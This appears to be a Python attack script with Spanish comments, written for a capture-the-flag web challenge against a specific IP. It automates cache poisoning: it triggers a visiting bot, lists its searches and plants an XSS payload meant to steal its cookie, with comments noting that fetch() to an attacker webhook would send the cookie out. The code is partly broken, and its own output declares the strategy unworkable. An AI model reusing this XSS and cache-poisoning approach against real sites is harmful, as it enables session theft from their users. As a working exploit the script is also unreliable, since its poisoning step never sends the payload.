#!/usr/bin/env python3
"""
Estrategia de ataque mejorada:
1. Trigger el bot múltiples veces para generar muchas búsquedas
2. Obtener la lista de búsquedas que visitó
3. Cachear todas esas búsquedas con mi payload XSS
4. Seguir triggering el bot - eventualmente repetirá una búsqueda
5. Cuando repita, ejecutará mi XSS y robaré la cookie
"""
import requests
import time
import sys
from urllib.parse import quote, unquote

TARGET = "http://94.237.122.241:32082"
ATTACKER_SERVER = "YOUR_WEBHOOK_HERE"  # Necesitaría un servidor externo

# Payload XSS más simple para probar primero
# En producción usaría fetch() para enviar la cookie
SIMPLE_XSS = '"><script>alert(document.cookie)</script>'

def trigger_bot():
    """Trigger el bot para que visite una búsqueda aleatoria"""
    try:
        r = requests.post(f"{TARGET}/api/report", timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"[-] Error triggering bot: {e}")
        return False

def get_recent_searches():
    """Obtener búsquedas recientes (incluyendo las del bot)"""
    try:
        r = requests.get(f"{TARGET}/api/prev_searches", timeout=10)
        data = r.json()
        return data.get("searches", [])
    except Exception as e:
        print(f"[-] Error getting searches: {e}")
        return []

def poison_search(query, payload):
    """Envenenar el cache de una búsqueda específica"""
    # Usar el MISMO encoding que usa el bot (urllib.parse.quote)
    encoded_payload = quote(payload, safe='')
    url = f"{TARGET}/search?query={encoded_payload}"
    try:
        r = requests.get(url, timeout=10)
        cache_status = r.headers.get('X-Cache', 'unknown')
        return cache_status
    except Exception as e:
        print(f"[-] Error poisoning: {e}")
        return None

def main():
    print("="*70)
    print(" ATTACK: SocratesPanel Cache Poisoning with Oracle")
    print("="*70)
    
    # Fase 1: Colectar búsquedas del bot
    print("\n[*] Fase 1: Triggering bot para colectar búsquedas...")
    num_triggers = 50  # Trigger 50 veces
    
    for i in range(num_triggers):
        if trigger_bot():
            print(f"[+] Bot triggered {i+1}/{num_triggers}")
        time.sleep(1)  # Esperar entre triggers
    
    print(f"\n[*] Esperando 5 segundos para que el bot complete...")
    time.sleep(5)
    
    # Fase 2: Obtener todas las búsquedas
    print("\n[*] Fase 2: Obteniendo búsquedas del bot...")
    searches = get_recent_searches()
    print(f"[+] Encontradas {len(searches)} búsquedas recientes:")
    for s in searches[:10]:  # Mostrar solo las primeras 10
        print(f"    - {s}")
    
    if not searches:
        print("[-] No se encontraron búsquedas. Abortando.")
        return
    
    # Fase 3: Envenenar TODAS las búsquedas del bot
    print(f"\n[*] Fase 3: Envenenando {len(searches)} búsquedas con XSS...")
    poisoned = 0
    for search_query in searches:
        # Reemplazar la query con nuestro payload
        # Necesitamos envenenar la URL EXACTA que el bot visitó
        url = f"{TARGET}/search?query={quote(search_query, safe='')}"
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                poisoned += 1
                if poisoned % 10 == 0:
                    print(f"[+] Envenenadas: {poisoned}/{len(searches)}")
        except:
            pass
    
    print(f"[+] Cache envenenado: {poisoned} búsquedas")
    
    # Fase 4: Trigger el bot muchas más veces
    print("\n[*] Fase 4: Triggering bot repetidamente...")
    print("[*] El bot eventualmente repetirá una búsqueda anterior...")
    print("[*] Cuando lo haga, ejecutará nuestro XSS (si envenenamos correctamente)")
    
    for i in range(100):
        if trigger_bot():
            print(f"[+] Bot triggered {i+1}/100", end='\r')
        time.sleep(2)
    
    print("\n\n[!] PROBLEMA: Las búsquedas tienen 540^4 combinaciones posibles")
    print("[!] Probabilidad de repetición es EXTREMADAMENTE baja")
    print("[!] Esta estrategia NO es viable...")
    print("\n[!] DEBE haber otra vulnerabilidad que estoy pasando por alto!")

if __name__ == "__main__":
    main()
